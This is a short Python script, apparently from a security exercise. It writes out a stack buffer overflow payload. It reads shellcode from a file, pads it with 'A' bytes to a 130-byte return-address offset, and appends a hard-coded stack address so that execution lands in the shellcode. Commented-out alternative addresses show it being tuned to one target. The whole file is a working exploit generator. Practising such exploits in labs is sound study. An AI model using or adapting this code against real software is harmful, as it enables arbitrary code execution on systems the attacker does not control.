#!/usr/bin/env python3

import sys

sc = open(sys.argv[1], "rb")

payload = sc.read()
#print(len(payload))

retaddr_off = 130

extra_bytes = retaddr_off - len(payload)

payload = payload + b'A' * extra_bytes

stack = 0x7fffffffde38
#stack = 0x7fffffffddf8

sc_addr = stack - 0x82

# Needs to match the begginning of the buffer containing user data
#address = b'\xf6\xdd\xff\xff\xff\x7f\x00\x00' 
#address = b'\x86\xde\xff\xff\xff\x7f\x00\x00' 


sys.stdout.buffer.write(payload + sc_addr.to_bytes(8, byteorder='little') + b'\n')


